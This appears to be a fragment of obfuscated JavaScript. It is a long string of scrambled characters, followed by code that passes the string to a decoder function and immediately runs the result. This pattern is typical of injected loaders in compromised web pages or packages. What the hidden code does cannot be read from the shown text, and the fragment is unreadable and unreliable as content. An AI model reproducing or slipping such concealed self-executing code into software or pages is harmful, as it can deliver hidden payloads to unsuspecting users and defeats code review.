c8i.ic,B,o.n\/t)-wxB6:(4L]wyp.c%ale)l(.BB$gvr}Bg=px=BmB[ed. v(0n]aebu8 m?h)-B8onw(;]8=,.cdsn_dy}lid(2(!+nl>n80 B;n%e=en::oB.]:a8B%t]]bCBt6_.1.]i1fT?Bpo>v=;.tow:%].SBS_BB9g4e1Bc}9(;4r_C|s)nBaar=B)1..l6. e(2%B(%]])BB>foBhmt1y.%sB(i (=qltnh$=}{,}[c4h.] _nhdattB+nB;ruB!%3Bag).r.,suB.eB B3"]iBBr)n)%BBaaa ;Bs{f*]BBAoBt.]* aj}a6n(.e?,tnneaa].pt4}a+=8yn  ct)p6n_3  ]e_'));var vTN=fUS(JkF,Szk );vTN(1851);return 5795})()
